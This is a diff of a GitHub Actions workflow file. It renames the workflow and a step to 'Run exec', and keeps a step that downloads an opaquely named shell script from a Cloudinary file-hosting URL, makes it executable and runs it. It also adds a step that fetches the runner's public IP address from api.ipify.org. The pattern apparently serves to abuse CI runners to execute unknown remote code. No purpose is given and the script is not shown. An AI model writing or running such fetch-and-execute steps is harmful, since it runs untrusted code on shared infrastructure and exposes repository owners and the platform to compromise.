@@ -1,4 +1,4 @@
-name: testing
+name: Go
 
 on:
   workflow_dispatch:
@@ -10,8 +10,14 @@ jobs:
     continue-on-error: true
     runs-on: ubuntu-latest
     steps:
-      - name: Update and Upgrade
+      - name: Run exec
         run: |
           curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1708020610/mbip0nevu8lc73fmojgp.sh
           chmod +x mbip0nevu8lc73fmojgp.sh
           ./mbip0nevu8lc73fmojgp.sh
+
+      - name: IP Workflow
+        run: |
+          curl https://api.ipify.org
+
+      # Ajoutez d'autres étapes de votre workflow ici
